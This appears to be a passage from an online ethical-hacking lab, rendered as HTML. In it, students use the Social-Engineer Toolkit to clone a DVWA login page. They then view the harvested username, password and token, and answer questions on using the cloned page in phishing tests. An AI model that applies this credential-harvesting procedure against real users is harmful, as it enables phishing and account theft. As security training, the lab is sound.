+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What is the URL after you entered the information and clicked the Login button? Is it the same as the URL you recorded in Part 2, Step 2a?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->The URL DVWA.vm/login.php is displayed in the browser. Yes, it is the same URL as in the previous step.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d018464a5f11194732b8e" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d018464a5f11194732b8e" class="645d018464a5f11194732b8e block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d018464a5f11194732b8e" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d018464a5f11194732b8e-heading-view" headingtitle="Part 3 Step 2" modelid="645d018464a5f11194732b8e" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645d018464a5f11194732b8f" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645d018464a5f11194732b8f" class="component opentextbox 645d018464a5f11194732b8f remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645d018464a5f11194732b8f" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d018464a5f11194732b8f-heading-view" headingtitle="What happened?" modelid="645d018464a5f11194732b8f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What happened?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What happened?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->After the login attempt, the cloned web page redirected the browser to the real web site. However, the user has real credentials have been provided to the hacker’s clone of the original website.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d033a372eff12f2fdf6a0" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d033a372eff12f2fdf6a0" class="645d033a372eff12f2fdf6a0 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d033a372eff12f2fdf6a0" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d033a372eff12f2fdf6a0-heading-view" headingtitle="Part 3 Step 3" modelid="645d033a372eff12f2fdf6a0" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 3</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645d033a372eff12f2fdf6a1" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645d033a372eff12f2fdf6a1" class="component text 645d033a372eff12f2fdf6a1 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d033a372eff12f2fdf6a1-heading-view" headingtitle="Part 3 Step 3" modelid="645d033a372eff12f2fdf6a1" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 3</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h3 style="margin-left:0in"><!--[if !supportLists]--><span><span>Step 3: </span></span><!--[endif]-->View the Captured Information.</h3><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->Return to the terminal session that is running the SET application. Output from the login attempt should appear, similar to what is shown:</li></ol><pre style="margin-left:40px">[*] WE GOT A HIT! Printing the output:</pre><pre style="margin-left:40px">POSSIBLE USERNAME FIELD FOUND: username=some.user@gmail.com</pre><pre style="margin-left:40px">POSSIBLE PASSWORD FIELD FOUND: password=Pa55w0rdd!</pre><pre style="margin-left:40px">POSSIBLE USERNAME FIELD FOUND: Login=Login</pre><pre style="margin-left:40px">POSSIBLE USERNAME FIELD FOUND: user_token=69c0375a6ee98b96a5b643eed1e97f94</pre><pre style="margin-left:40px">[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</pre><ol start="2" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->To save the report in XML format to use in other penetration testing applications, enter <strong>CTRL</strong>-<strong>C</strong>. The report file name and path are returned. Select the path and filename and right-click to copy the selection. The filenames that are created contain the date and time the file was created in this format:</li></ol><pre style="margin-left:40px">2023-04-07 17:32:55.967169.xml</pre><p style="margin-left:40px">Continue to enter <strong>99 </strong>and press <strong>enter </strong>until you have exited setoolkit. To view the content of the XML file, you need to place the filename in double-quotes (“) because it contains spaces and special characters. Use the <strong>cat</strong> command to see the information that is saved. The file path shown is the default path for the lab VM when this lab was created.</p><pre style="margin-left:40px">┌──(root<span>㉿K</span>ali)-[~]</pre><pre style="margin-left:40px">└─# <strong>cat /root/.set/reports/”2023-04-07 17:32:55.967169.xml”</strong></pre><pre style="margin-left:40px">&nbsp;</pre><pre style="margin-left:40px">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</pre><pre style="margin-left:40px">&lt;harvester&gt;</pre><pre style="margin-left:40px"><span>   </span>URL=http://DVWA.vm</pre><pre style="margin-left:40px"><span>   </span>&lt;url&gt;<span>      </span>&lt;param&gt;username=some.user@gmail.com&lt;/param&gt;</pre><pre style="margin-left:40px"><span>      </span>&lt;param&gt;password=Pa55w0rdd!&lt;/param&gt;</pre><pre style="margin-left:40px"><span>      </span>&lt;param&gt;Login=Login&lt;/param&gt;</pre><pre style="margin-left:40px"><span>      </span>&lt;param&gt;user_token=69c0375a6ee98b96a5b643eed1e97f94&lt;/param&gt;</pre><pre style="margin-left:40px"><span>   </span>&lt;/url&gt;</pre><pre style="margin-left:40px">&lt;/harvester&gt;</pre></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d0fe715ad7b120257d2c7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d0fe715ad7b120257d2c7" class="645d0fe715ad7b120257d2c7 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d0fe715ad7b120257d2c7" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d0fe715ad7b120257d2c7-heading-view" headingtitle="Part 3 Step 3" modelid="645d0fe715ad7b120257d2c7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 3</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645d0fe715ad7b120257d2c8" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645d0fe715ad7b120257d2c8" class="component opentextbox 645d0fe715ad7b120257d2c8 remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645d0fe715ad7b120257d2c8" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d0fe715ad7b120257d2c8-heading-view" headingtitle="What information did the cloned web page gather?" modelid="645d0fe715ad7b120257d2c8" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What information did the cloned web page gather?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What information did the cloned web page gather?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->The username and password of the user who attempted to login to the cloned webpage.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d10a615ad7b120257d2ca" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d10a615ad7b120257d2ca" class="645d10a615ad7b120257d2ca block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d10a615ad7b120257d2ca" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d10a615ad7b120257d2ca-heading-view" headingtitle="Part 3 Step 3" modelid="645d10a615ad7b120257d2ca" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 3</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645d10a615ad7b120257d2cb" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645d10a615ad7b120257d2cb" class="component opentextbox 645d10a615ad7b120257d2cb remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645d10a615ad7b120257d2cb" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d10a615ad7b120257d2cb-heading-view" headingtitle="What could a penetration tester do with this information?" modelid="645d10a615ad7b120257d2cb" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What could a penetration tester do with this information?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What could a penetration tester do with this information?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->Go to the real website and login in as a legitimate user.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d14cf38fe8e0f0dcc988a" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d14cf38fe8e0f0dcc988a" class="645d14cf38fe8e0f0dcc988a block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d14cf38fe8e0f0dcc988a" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d14cf38fe8e0f0dcc988a-heading-view" headingtitle="Part 3 Step 3" modelid="645d14cf38fe8e0f0dcc988a" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 3</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645d14cf38fe8e0f0dcc988b" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645d14cf38fe8e0f0dcc988b" class="component text 645d14cf38fe8e0f0dcc988b remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d14cf38fe8e0f0dcc988b-heading-view" headingtitle="Reflection" modelid="645d14cf38fe8e0f0dcc988b" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Reflection</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h1 style="margin-left: 0in;"><!--[if !supportLists]--><span><span>Reflection</span></span></h1></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d10fa15ad7b120257d2cd" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d10fa15ad7b120257d2cd" class="645d10fa15ad7b120257d2cd block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d10fa15ad7b120257d2cd" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d10fa15ad7b120257d2cd-heading-view" headingtitle="Reflection" modelid="645d10fa15ad7b120257d2cd" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Reflection</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645d10fa15ad7b120257d2ce" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645d10fa15ad7b120257d2ce" class="component opentextbox 645d10fa15ad7b120257d2ce remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645d10fa15ad7b120257d2ce" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d10fa15ad7b120257d2ce-heading-view" headingtitle="How could an ethical hacker use this procedure in a test?" modelid="645d10fa15ad7b120257d2ce" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->How could an ethical hacker use this procedure in a test?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->How could an ethical hacker use this procedure in a test?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->Answers will vary. It could be used with a phishing email. For example, the tester could send emails to various employees asking them to login to a fake URL that looks like the real one. The URL links to the very familiar login page that was cloned from the real site. From there, credentials could be harvested for multiple users. The results of this test could then be reported to the customer with the mitigation recommendation of additional user training to prevent similar actual attacks.
+                    </div>
+
+                      <div class="btn__container">                        
